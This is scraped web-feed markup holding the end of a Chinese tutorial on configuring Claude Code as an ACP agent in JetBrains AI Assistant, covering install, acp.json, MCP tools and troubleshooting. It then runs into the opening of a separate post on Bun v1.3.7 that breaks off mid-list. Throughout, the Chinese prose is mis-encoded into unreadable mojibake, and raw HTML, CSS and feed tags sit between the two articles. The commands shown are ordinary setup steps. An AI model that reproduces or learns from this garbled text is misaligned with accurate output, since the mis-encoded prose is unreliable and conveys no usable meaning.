<p>æ‰“å¼€ AI Assistant çš„èŠå¤©é¢æ¿ï¼Œç‚¹å‡»å³ä¸Šè§’é€‰æ‹©ä¸‹æ‹‰æ¡†ï¼Œä½ ä¼šçœ‹åˆ° <strong>ã€Œé…ç½® ACP æ™ºèƒ½ä½“ã€</strong> é€‰é¡¹ã€‚</p>
<p>ç‚¹å‡»åï¼ŒIDE ä¼šè‡ªåŠ¨æ‰“å¼€ä¸€ä¸ª <code>acp.json</code> é…ç½®æ–‡ä»¶ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/366cba9af1444df9b10a3ea4a6022a2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770197598&amp;x-signature=XdD02417833414koz9HlgJMWhSY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">ç¬¬äºŒæ­¥ï¼šå®‰è£… claude-code-acp</h3>
<p>Zed å®˜æ–¹æä¾›äº†ä¸€ä¸ª ACP é€‚é…å™¨ <code>@zed-industries/claude-code-acp</code>ï¼Œç”¨æ¥æ¡¥æ¥ Claude Code å’Œ ACP åè®®ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">pnpm install -g @zed-industries/claude-code-acp
</code></pre>
<p>æ³¨æ„å¿…é¡»ç”¨ <code>-g</code> å…¨å±€å®‰è£…ï¼Œè¿™æ · ACP Server æ‰èƒ½ä½œä¸ºç‹¬ç«‹å‘½ä»¤è¢«è°ƒç”¨ã€‚</p>
<p>å®‰è£…å®Œæˆåï¼Œä½ ä¼šåœ¨å…¨å±€ bin ç›®å½•é‡Œçœ‹åˆ° <code>claude-code-acp</code> å‘½ä»¤ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">â¯ pnpm bin -g
/Users/guide/Library/pnpm
â¯ <span class="hljs-built_in">ls</span> /Users/guide/Library/pnpm
claude-code-acp global          store
</code></pre>
<h3 data-id="heading-8">ç¬¬ä¸‰æ­¥ï¼šç¼–è¾‘ acp.json</h3>
<p>åœ¨ <code>acp.json</code> ä¸­æ·»åŠ  Claude Code çš„é…ç½®ï¼š</p>
<pre><code class="hljs language-json" lang="json">  <span class="hljs-attr">"agent_servers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"Claude Code"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/Users/guide/Library/pnpm/claude-code-acp"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
</code></pre>
<p>æ³¨æ„å°†è·¯å¾„æ›¿æ¢ä¸ºä½ æœ¬åœ°çš„ï¼Œæˆ–è€…å°†å…¶æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ä¸­ã€‚</p>
<p>ä¿å­˜æ–‡ä»¶åï¼Œå›åˆ° AI Assistant çš„èŠå¤©é¢æ¿ï¼Œå†æ¬¡ç‚¹å‡»æ¨¡å‹é€‰æ‹©ä¸‹æ‹‰æ¡†ï¼Œä½ åº”è¯¥èƒ½çœ‹åˆ° <strong>Claude Code</strong> å‡ºç°åœ¨åˆ—è¡¨é‡Œäº†ã€‚</p>
<h2 data-id="heading-9">çˆ½ç”¨ Claude Code</h2>
<h3 data-id="heading-10">åŸºç¡€å¯¹è¯</h3>
<p>é€‰æ‹© Claude Code ä½œä¸º Agent åï¼Œä½ å°±å¯ä»¥åƒç”¨å†…ç½® Claude ä¸€æ ·è¿›è¡Œå¯¹è¯ï¼š</p>
<ul>
<li>ä»£ç ç¼–å†™</li>
<li>ä»£ç è§£é‡Š</li>
<li>Bug è¯Šæ–­</li>
<li>é‡æ„å»ºè®®</li>
<li>ç”Ÿæˆå•å…ƒæµ‹è¯•</li>
</ul>
<p>è¿™ä¸ªå‘¨æœ«ï¼Œæˆ‘å°±é€šè¿‡è¿™ç§æ–¹å¼æˆåŠŸé‡æ„ä¼˜åŒ–äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fzhuanlan%2Finterview-guide.html" target="_blank" title="https://javaguide.cn/zhuanlan/interview-guide.html" ref="nofollow noopener noreferrer">ã€ŠSpringAI æ™ºèƒ½é¢è¯•å¹³å°+RAG çŸ¥è¯†åº“ã€‹</a>è¿™ä¸ªé¡¹ç›®ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/698b720bea144c17965a8323ca3f9443~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770197598&amp;x-signature=84ysSaJ5K4uwWlPAjH7pOyniYLE%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸ªé¡¹ç›®çš„é…å¥—å®æˆ˜é¡¹ç›®æ•™ç¨‹æ­£åœ¨æ›´æ–°ï¼Œæ¶‰åŠåˆ° Prompt Engineeringã€å¤§æ¨¡å‹é›†æˆã€RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰ã€é«˜æ€§èƒ½å¯¹è±¡å­˜å‚¨ä¸å‘é‡æ•°æ®åº“ã€‚åç»­çš„è¯ï¼Œè¿˜ä¼šåŒæ­¥ä¸ŠAgent é¡¹ç›®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da03c8521a574eb1a8e5f6c8f81b43b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770197598&amp;x-signature=gSrToHuo58ck3OhKyIAQoRyCEKY%3D" alt="" loading="lazy"/></p>
<p>å†…å®¹éå¸¸å…¨é¢ï¼Œéå¸¸é€‚åˆæƒ³è¦å®æˆ˜ AI é¡¹ç›®æˆ–è€…å‡†å¤‡ AI å¤§æ¨¡å‹åº”ç”¨å¼€å‘å²—ä½é¢è¯•çš„æœ‹å‹ï¼Œæ¥ä¸€å¼ åˆšå†™å®Œçš„<strong>3.4w å­—+35 é“é¢˜ç›®</strong>çš„ RAG é¢è¯•é¢˜æ€»ç»“ï¼Œå¤§å®¶æ„Ÿå—ä¸€ä¸‹ï¼ˆç‚¹æ­¤é“¾æ¥äº†è§£ï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fabout-the-author%2Fzhishixingqiu-two-years.html" target="_blank" title="https://javaguide.cn/about-the-author/zhishixingqiu-two-years.html" ref="nofollow noopener noreferrer">æ˜Ÿçƒ</a>ï¼‰ï¼š</p>
<h3 data-id="heading-11">æ¨¡å¼å’Œæ¨¡å‹é€‰æ‹©</h3>
<p>Claude Code çš„ ACP æ¨¡å¼ä¼šè¯†åˆ«ä½ åŸæœ¬é…ç½®çš„æ‰€æœ‰è®¾ç½®ï¼ŒåŒ…æ‹¬ï¼š</p>
<ol>
<li><strong>æ¨¡å¼é€‰æ‹©</strong>ï¼šPlan æ¨¡å¼ã€Code æ¨¡å¼ç­‰</li>
<li><strong>æ¨¡å‹é€‰æ‹©</strong>ï¼šclaude-sonnet-4.5ã€claude-opus-4.5 ç­‰</li>
<li><strong>ç¬¬ä¸‰æ–¹ä¸­è½¬ç«™</strong>ï¼šå¦‚æœä½ é…ç½®äº†è‡ªå®šä¹‰ API åœ°å€ï¼Œä¹Ÿä¼šç”Ÿæ•ˆ</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d34ba5ea908473a95f4dd44e604f8a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770197598&amp;x-signature=zO9ZIrJE7WJQMYu%2FRlrGyXGeDNE%3D" alt="" loading="lazy"/></p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘è¿™é‡Œç›®å‰å°±æˆåŠŸå¯¹æ¥äº†ç¬¬ä¸‰æ–¹ GLM æ¨¡å‹ï¼Œè¿™ä¸ªåœ¨å›½å†…ä¹Ÿæ˜¯ç”¨çš„äººæ¯”è¾ƒå¤šçš„ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09e775f898014550a526b502f13bcba8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770197598&amp;x-signature=2Qn%2By8xyQpDMOmJRQr3nlXOZcX0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12">MCP å·¥å…·æ”¯æŒ</h3>
<p>è¿™æ˜¯ ACP æ–¹å¼ç›¸æ¯”å†…ç½® Agent çš„æœ€å¤§ä¼˜åŠ¿â€”â€”<strong>å®Œæ•´æ”¯æŒ MCPï¼ˆModel Context Protocolï¼‰å·¥å…·</strong>ã€‚</p>
<p>MCP æ˜¯ Anthropic æ¨å‡ºçš„å¦ä¸€ä¸ªåè®®ï¼Œç”¨æ¥è®© LLM æ¥å…¥å¤–éƒ¨å·¥å…·å’Œæ•°æ®æºã€‚æ¯”å¦‚ä½ å¯ä»¥é…ç½®ï¼š</p>
<ul>
<li><strong>æ–‡ä»¶ç³»ç»Ÿå·¥å…·</strong>ï¼šè®© Agent è¯»å†™é¡¹ç›®æ–‡ä»¶</li>
<li><strong>Git å·¥å…·</strong>ï¼šè®© Agent æ‰§è¡Œ commitã€diff æ“ä½œ</li>
<li><strong>æ•°æ®åº“å·¥å…·</strong>ï¼šè®© Agent æŸ¥è¯¢ç”Ÿäº§ç¯å¢ƒæ•°æ®</li>
<li><strong>è‡ªå®šä¹‰ API</strong>ï¼šæ¥å…¥å…¬å¸å†…éƒ¨æœåŠ¡</li>
</ul>
<p>ç”¨ ACP æ¥å…¥ Claude Code åï¼Œè¿™äº› MCP å·¥å…·éƒ½ä¼šè¢«è¯†åˆ«å¹¶å¯ç”¨ã€‚è€Œ AI Assistant å†…ç½®çš„ Claude Agent åªèƒ½è¯†åˆ«ç¬¬ä¸‰æ–¹ API åœ°å€ï¼ŒMCP å·¥å…·æ˜¯<strong>ä¸æ”¯æŒ</strong>çš„ã€‚</p>
<h2 data-id="heading-13">ACP vs å†…ç½® Agentï¼šå¦‚ä½•é€‰æ‹©ï¼Ÿ</h2>













































<table><thead><tr><th><strong>ç‰¹æ€§</strong></th><th><strong>ACP (Claude Code + Adapter)</strong></th><th><strong>IDEA å†…ç½® Claude Agent (å®˜æ–¹/ä¸‰æ–¹æ’ä»¶)</strong></th></tr></thead><tbody><tr><td><strong>æ ¸å¿ƒå®šä½</strong></td><td>ç»ˆç«¯é©±åŠ¨çš„ä»»åŠ¡å‹æœºå™¨äºº (Task-Oriented)</td><td>ä¾§è¾¹æ å¯¹è¯å‹åŠ©æ‰‹ (Chat-Oriented)</td></tr><tr><td><strong>MCP å·¥å…·æ”¯æŒ</strong></td><td><strong>âœ… å®Œæ•´åŸç”Ÿæ”¯æŒ</strong> (å¯è°ƒç”¨æœ¬åœ° Python/DB ç­‰)</td><td><strong>âŒ æ”¯æŒæœ‰é™</strong> (å¤šå±€é™äº IDE å†…éƒ¨ API)</td></tr><tr><td><strong>æ¨¡å‹çµæ´»æ€§</strong></td><td><strong>âœ… æé«˜</strong> (è‡ªç”±åˆ‡æ¢ 3.5 Sonnet / 3.7 / Opus)</td><td><strong>âš ï¸ å—é™</strong> (é€šå¸¸ç»‘å®šæ’ä»¶å•†æä¾›çš„ç‰¹å®šç‰ˆæœ¬)</td></tr><tr><td><strong>API å…¼å®¹æ€§</strong></td><td><strong>âœ… æ”¯æŒ</strong> ä¸­è½¬ç«™ / OneAPI ç­‰è‡ªå®šä¹‰ Endpoint</td><td><strong>âš ï¸ éƒ¨åˆ†æ”¯æŒ</strong> (å®˜æ–¹æ’ä»¶å¸¸å¼ºåˆ¶è¦æ±‚å®˜æ–¹ Key)</td></tr><tr><td><strong>å·¥ä½œæ¨¡å¼</strong></td><td><strong>âœ… æ‹¥æœ‰ Plan / Act ç‹¬ç«‹æ¨¡å¼</strong></td><td><strong>âŒ ä¸»è¦æ˜¯å•è½®æˆ–å¤šè½®å¯¹è¯</strong></td></tr><tr><td><strong>ç¯å¢ƒä¸Šä¸‹æ–‡</strong></td><td><strong>âœ… å¼º</strong> (é€šè¿‡ MCP ç›´æ¥è¯»å–ç³»ç»Ÿ/åº“æ–‡æ¡£)</td><td><strong>âœ… å¼º</strong> (æ·±åº¦é›†æˆ IDE ç´¢å¼•ï¼Œç†è§£ä»£ç åº“)</td></tr><tr><td><strong>é…ç½®é—¨æ§›</strong></td><td><strong>è¾ƒé«˜</strong> (éœ€è¦é…ç½® Node ç¯å¢ƒåŠ Proxy)</td><td><strong>æä½</strong> (æ’ä»¶å¸‚åœºä¸€é”®å®‰è£…)</td></tr></tbody></table>
<p><strong>å»ºè®®</strong>ï¼š</p>
<ul>
<li>å¦‚æœä½ <strong>éœ€è¦ MCP å·¥å…·</strong>ï¼Œå¿…é¡»ç”¨ ACP æ–¹å¼</li>
<li>å¦‚æœä½ <strong>ä¹ æƒ¯ Claude Code çš„ Plan æ¨¡å¼</strong>ï¼Œç”¨ ACP æ›´é¡ºæ‰‹</li>
<li>å¦‚æœä½ <strong>æƒ³è¦å¼€ç®±å³ç”¨</strong>ï¼Œå†…ç½® Agent æ›´çœå¿ƒ</li>
</ul>
<h2 data-id="heading-14">æ¥å…¥å…¶ä»– Agent</h2>
<p>é™¤äº† Claude Codeï¼Œä½ ä¹Ÿå¯ä»¥æ¥å…¥å…¶ä»–æ”¯æŒ ACP çš„ Agentã€‚æ¯”å¦‚ Gemini CLI (Google) ã€ Cagent (Docker)ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"agent_servers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"Claude Code"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/Users/guide/Library/pnpm/claude-code-acp"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"Gemini CLI"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"gemini-acp"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"--model"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"gemini-2.0-pro"</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"Docker Cagent"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cagent"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"acp"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"agent.yml"</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-15">è¸©å‘ä¸æ’æŸ¥</h2>
<h3 data-id="heading-16">ACP åˆå§‹åŒ–å¤±è´¥</h3>
<p>JetBrains AI Assistant æ— æ³•è¿è¡Œ "pnpm" å‘½ä»¤ï¼ˆ<code>IOException: Cannot run program "pnpm", error=2, No such file or directory</code>ï¼‰ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">â¯ pnpm bin -g
/Users/guide/Library/pnpm
â¯ <span class="hljs-built_in">ls</span> /Users/guide/Library/pnpm
claude-code-acp global
</code></pre>
<p>æ³¨æ„å°† command è·¯å¾„æ›¿æ¢ä¸ºä½ æœ¬åœ°çš„ï¼Œæˆ–è€…å°†å…¶æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ä¸­ã€‚</p>
<h3 data-id="heading-17">Agent æ— å“åº”</h3>
<p>å¦‚æœé€‰æ‹© Agent åèŠå¤©æ²¡ååº”ï¼š</p>
<ol>
<li>æ£€æŸ¥ Agent è¿›ç¨‹æ˜¯å¦å¯åŠ¨ï¼š<code>ps aux | grep claude-code-acp</code></li>
<li>æŸ¥çœ‹ AI Assistant çš„æ—¥å¿—ï¼š<code>Help &gt; Show Log in Finder</code></li>
<li>ç¡®è®¤ Claude Code æœ¬èº«èƒ½æ­£å¸¸åœ¨ç»ˆç«¯è¿è¡Œ</li>
</ol>
<h2 data-id="heading-18">æ€»ç»“</h2>
<p>ACP ç›®å‰è¿˜å¤„äºå¿«é€Ÿå‘å±•é˜¶æ®µï¼Œ2025 å¹´åº•æ‰æ­£å¼è¿›å…¥ Betaã€‚æœ‰å‡ ä¸ªå€¼å¾—æœŸå¾…çš„æ–¹å‘ï¼š</p>
<ol>
<li><strong>æ›´å¤š Agent æ”¯æŒ</strong>ï¼šCursorã€Windsurf ç­‰çƒ­é—¨ AI å·¥å…·å¯èƒ½ä¼šæ¨å‡º ACP Server</li>
<li><strong>Per-Project é…ç½®</strong>ï¼šJetBrains çš„ Issue è¿½è¸ªæ˜¾ç¤ºï¼Œä»–ä»¬æ­£åœ¨è®¡åˆ’æ”¯æŒé¡¹ç›®çº§åˆ«çš„ ACP é…ç½®</li>
<li><strong>ç¤¾åŒºç”Ÿæ€</strong>ï¼šéšç€åè®®å¼€æ”¾ï¼Œå¯èƒ½ä¼šå‡ºç°æ›´å¤šç¬¬ä¸‰æ–¹ Agent</li>
</ol>
<p>å¦‚æœä½ æ˜¯ JetBrains IDE çš„é‡åº¦ç”¨æˆ·ï¼Œåˆä¸å¤ªå–œæ¬¢åœ¨ç»ˆç«¯ç¯å¢ƒä½¿ç”¨ Claude Code ï¼Œæˆ–è€…ä½ éœ€è¦ MCP å·¥å…·çš„å¼ºå¤§èƒ½åŠ›ï¼Œé‚£ä¹ˆ ACP å°±æ˜¯ç›®å‰çš„ç»ˆæè§£å†³æ–¹æ¡ˆã€‚</p>
<p>è™½ç„¶é…ç½®ç¨å¾®éº»çƒ¦ä¸€ç‚¹ï¼Œä½†ä¸€æ—¦æå®šï¼Œä½ å°±èƒ½åœ¨ç†Ÿæ‚‰çš„ IDE ç¯å¢ƒé‡Œè·å¾—ï¼š</p>
<ul>
<li>ç¨³å®šçš„ UI ä½“éªŒ</li>
<li>å®Œæ•´çš„ Claude Code åŠŸèƒ½</li>
<li>MCP å·¥å…·çš„åŠ æŒ</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Bun v1.3.7æ›´æ–°çŸ­è¯„]]></title>    <link>https://juejin.cn/post/7599927813602000936</link>    <guid>https://juejin.cn/post/7599927813602000936</guid>    <pubDate>2026-01-28T04:52:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7599927813602000936" data-draft-id="7599927813601984552" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Bun v1.3.7æ›´æ–°çŸ­è¯„"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-28T04:52:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯ä¹‹è™é™ˆéšæ˜“"/> <meta itemprop="url" content="https://juejin.cn/user/1239904846873326"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Bun v1.3.7æ›´æ–°çŸ­è¯„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1239904846873326/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯ä¹‹è™é™ˆéšæ˜“
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-28T04:52:23.000Z" title="Wed Jan 28 2026 04:52:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å†œæ‘ç¨‹åºå‘˜ï¼Œç‹¬ç«‹å¼€å‘è€…ï¼Œå‰ç«¯ä¹‹è™é™ˆéšæ˜“ï¼ŒæŠ€æœ¯ç¾¤ä¸äº¤æœ‹å‹è¯·åœ¨ä¸ªäººç½‘ç«™ ğŸ‘‡ è”ç³»æˆ‘ âœŒï¸</p>
<ul>
<li>ä¸ªäººç½‘ç«™ 1ï¸âƒ£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fchensuiyi.me" target="_blank" title="https://chensuiyi.me" ref="nofollow noopener noreferrer">chensuiyi.me</a></li>
<li>ä¸ªäººç½‘ç«™ 2ï¸âƒ£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fme.yicode.tech" target="_blank" title="https://me.yicode.tech" ref="nofollow noopener noreferrer">me.yicode.tech</a></li>
</ul>
<p>æˆ‘çš„æ‰€æœ‰æ–‡ç« å‡ä¸ºå¤æ³•æ‰‹å†™ï¼Œæ—  AI æ·»åŠ å‰‚ï¼Œè¯·æ”¾å¿ƒé£Ÿç”¨ï¼Œå¦‚æœä½ è§‰å¾—æœ¬æ–‡æœ‰ç”¨ï¼Œä¸€é”®ä¸‰è¿ (<code>ç‚¹èµ</code>ã€<code>è¯„è®º</code>ã€<code>è½¬å‘</code>)ï¼Œå°±æ˜¯å¯¹æˆ‘æœ€å¤§çš„æ”¯æŒ~</p>
<hr/>
<p>è·ç¦»v1.3.6å‘å¸ƒåº”è¯¥ä¸åˆ°åŠä¸ªæœˆå§ï¼Œv1.3.7å·²ç»å‘å¸ƒäº†ï¼ŒBunçš„å‘ç‰ˆèŠ‚å¥çœŸæ˜¯æ¯”ç«ç®­è¿˜å¿«ã€‚</p>
<p>å‘ç‰ˆå¿«å°±ç®—äº†ï¼Œæ›´ç‰›çš„æ˜¯ï¼Œæ¯æ¬¡éƒ½èƒ½å¸¦æ¥ä¸€äº›äº®çœ¼çš„åŠŸèƒ½ï¼Œæœ¬æ–‡å°±æ¥ç®€å•ç›˜ç‚¹ä¸€ä¸‹ã€‚</p>
<h2 data-id="heading-0">å¿«ï¼Œå¿«ï¼Œå¿«</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72ac7599408347e39c54474e5c07eb06~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LmL6JmO6ZmI6ZqP5piT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770180743&amp;x-signature=42Y00%2BNu4JMhZcqeIfxn0RTJZwc%3D" alt="" loading="lazy"/></p>
<p>æ€§èƒ½æ˜¯Bunçš„ä¸»æ‰“æ–¹å‘ï¼Œè¿™æ¬¡ä¹Ÿä¸ä¾‹å¤–ï¼Œå¸¦æ¥äº†å¤§é‡çš„æ€§èƒ½æå‡ã€‚</p>
<ul>
<li><code>Buffer.from</code> å¿«äº†<code>50%</code></li>
